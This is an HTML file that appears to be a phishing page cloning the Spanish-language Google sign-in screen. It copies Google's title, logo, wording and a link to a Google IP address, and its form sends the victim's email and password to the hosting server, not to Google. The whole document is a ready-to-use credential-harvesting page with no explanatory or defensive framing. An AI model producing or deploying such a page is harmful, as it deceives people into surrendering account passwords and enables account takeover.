<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<link rel="icon" type="image/x-icon" href="/favicon" />
		<link rel="stylesheet" href="style" />
		<title>Google</title>
	</head>
	<body>
		<div id="main">
			<img src="/logo" alt="" />
			<p id="title">Iniciar sesión</p>
			<form action="/" method="POST">
				<div id="inputs">
					<input
						type="email"
						class="input"
						id="email"
						name="email"
						value=""
						placeholder="Correo electrónico o teléfono"
						required
					/>
					<input
						type="password"
						class="input"
						id="pass"
						name="pass"
						value=""
						placeholder="Introduce tu contraseña"
						required
					/>
					<label id="checkbox">
						<input type="checkbox" id="switch" />
						Mostrar contraseña
					</label>
					<p style="color: #5f6368; font-size: 14px">
						¿No es tu ordenador? Usa una ventana privada para
						iniciar sesión.
						<a href="http://172.217.17.14/accounts/"
							>Más información</a
						>
					</p>
				</div>

				<div id="buttonDiv">
					<input type="submit" id="submitButton" value="Siguiente" />
				</div>
			</form>
		</div>
		<script src="/script"></script>
	</body>
</html>
